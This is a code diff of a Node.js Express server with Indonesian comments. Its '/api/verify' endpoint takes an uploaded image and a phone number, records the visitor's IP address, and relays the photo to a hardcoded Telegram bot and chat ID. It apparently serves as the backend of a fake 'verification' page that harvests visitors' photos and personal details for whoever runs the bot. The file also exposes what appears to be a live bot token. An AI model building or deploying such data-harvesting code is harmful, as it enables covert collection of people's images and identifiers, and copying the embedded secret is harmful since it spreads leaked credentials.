@@ -6,7 +6,7 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// HARDCODE - Tidak pakai environment variable
+// HARDCODE
 const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
 const CHAT_ID = '7352381955';
 
@@ -18,12 +18,24 @@ console.log(`📱 CHAT_ID: ${CHAT_ID}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('========================================');
 
-// Middleware
+// Cek bot token valid
+async function checkBot() {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+    const data = await res.json();
+    console.log('🤖 Bot check:', data.ok ? '✅ VALID' : '❌ INVALID');
+    if (!data.ok) console.log('❌ Error:', data.description);
+  } catch (err) {
+    console.error('❌ Bot check error:', err.message);
+  }
+}
+checkBot();
+
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 
-// ===== TEST ENDPOINTS =====
+// ===== TEST BOT =====
 app.get('/test-bot', async (req, res) => {
   console.log('🧪 Testing bot...');
   try {
@@ -37,6 +49,7 @@ app.get('/test-bot', async (req, res) => {
   }
 });
 
+// ===== TEST SEND MESSAGE =====
 app.get('/test-send', async (req, res) => {
   console.log('🧪 Testing send message...');
   try {
@@ -57,7 +70,7 @@ app.get('/test-send', async (req, res) => {
   }
 });
 
-// ===== VERIFY ENDPOINT =====
+// ===== VERIFY =====
 app.post('/api/verify', async (req, res) => {
   console.log('========================================');
   console.log('📸 NEW VERIFICATION REQUEST');
@@ -70,6 +83,7 @@ app.post('/api/verify', async (req, res) => {
     console.log(`📱 Phone: ${phone || 'Not provided'}`);
     console.log(`📸 Image exists: ${image ? 'YES' : 'NO'}`);
     console.log(`📸 Image length: ${image ? image.length : 0}`);
+    console.log(`📸 Image preview: ${image ? image.substring(0, 50) : 'null'}`);
     
     if (!image) {
       console.log('❌ No image received');
@@ -79,9 +93,16 @@ app.post('/api/verify', async (req, res) => {
       });
     }
     
+    // Extract base64
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
+    console.log(`📸 Base64 length: ${base64Data.length}`);
+    
     const buffer = Buffer.from(base64Data, 'base64');
-    console.log(`📸 Image size: ${buffer.length} bytes`);
+    console.log(`📸 Buffer size: ${buffer.length} bytes`);
+    
+    if (buffer.length < 100) {
+      console.log('⚠️ Buffer terlalu kecil, mungkin gambar kosong');
+    }
     
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     console.log(`🌐 IP: ${ip}`);
@@ -124,6 +145,7 @@ app.post('/api/verify', async (req, res) => {
       contentType: 'image/jpeg' 
     });
     
+    console.log('📤 Sending request to Telegram API...');
     const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: form,
@@ -132,6 +154,7 @@ app.post('/api/verify', async (req, res) => {
     const tgData = await tgResponse.json();
     console.log('📨 Telegram response status:', tgResponse.status);
     console.log('📨 Telegram success:', tgData.ok);
+    console.log('📨 Telegram data:', JSON.stringify(tgData));
     
     if (!tgData.ok) {
       console.error('❌ Telegram error:', JSON.stringify(tgData));
@@ -155,14 +178,14 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
-// ===== ROOT =====
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ===== START SERVER =====
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📊 Test bot: https://your-app.railway.app/test-bot`);
+  console.log(`📊 Test send: https://your-app.railway.app/test-send`);
   console.log('========================================');
 });
